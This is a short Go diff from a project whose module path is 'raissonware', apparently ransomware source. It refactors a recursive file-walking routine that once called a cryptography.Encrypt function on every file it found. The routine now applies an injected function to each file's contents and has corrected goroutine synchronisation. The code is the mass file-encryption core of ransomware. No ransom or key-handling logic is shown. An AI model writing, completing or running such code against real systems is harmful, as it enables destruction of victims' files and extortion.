@@ -3,14 +3,12 @@ package filesystem
 import (
 	"os"
 	"path/filepath"
-	"raissonware/pkg/cryptography"
 	"sync"
 )
 
-// FindFiles recursively search for files and executes the EncryptFile function
+// FindFiles recursively search for files and executes the given function
 func FindFiles(path string, exec func([]byte) ([]byte, error), wg *sync.WaitGroup, chanErr chan error) {
 	defer wg.Done()
-	wg.Add(1)
 
 	files, err := os.ReadDir(path)
 	if err != nil {
@@ -22,17 +20,16 @@ func FindFiles(path string, exec func([]byte) ([]byte, error), wg *sync.WaitGrou
 		subPath := filepath.Join(path, file.Name())
 
 		if file.IsDir() {
+			wg.Add(1)
 			go FindFiles(subPath, exec, wg, chanErr)
 			continue
 		}
 
-		AlterFile(subPath, cryptography.Encrypt, wg, chanErr)
+		alterFile(subPath, exec, chanErr)
 	}
 }
 
-func AlterFile(path string, exec func([]byte) ([]byte, error), wg *sync.WaitGroup, chanErr chan error) {
-	defer wg.Done()
-	wg.Add(1)
+func alterFile(path string, exec func([]byte) ([]byte, error), chanErr chan error) {
 
 	fileInfo, err := os.Stat(path)
 	if err != nil {
